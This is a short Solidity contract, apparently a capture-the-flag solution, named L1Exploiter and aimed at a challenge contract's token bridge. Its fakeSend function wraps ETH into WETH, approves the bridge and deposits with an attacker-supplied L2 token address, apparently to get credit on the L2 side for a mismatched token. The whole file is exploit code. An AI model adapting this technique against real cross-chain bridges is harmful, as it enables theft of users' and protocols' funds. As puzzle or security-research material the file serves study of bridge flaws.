// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Challenge {
    function BRIDGE() external returns (address);
    function WETH() external returns (address);
}

interface IMessenger {
    function sendMessage(address _target, bytes memory _message) external;
}

interface L1Bridge {
    function depositERC20To(address _l1Token, address _l2Token, address _to, uint256 _amount) external;
}

interface WETH9 {
    function deposit() external payable;
    function approve(address, uint256) external;
}

contract L1Exploiter {
    Challenge challenge = Challenge(0x1B2C9Fc83d9FE6F65473851ba9C72222AFF81e24);

    function fakeSend(address l2Token) external payable {
        L1Bridge bridge = L1Bridge(challenge.BRIDGE());
        WETH9 weth = WETH9(challenge.WETH());

        weth.deposit{value: msg.value}();
        weth.approve(address(bridge), type(uint256).max);

        bridge.depositERC20To(address(weth), l2Token, msg.sender, msg.value);
    }
}
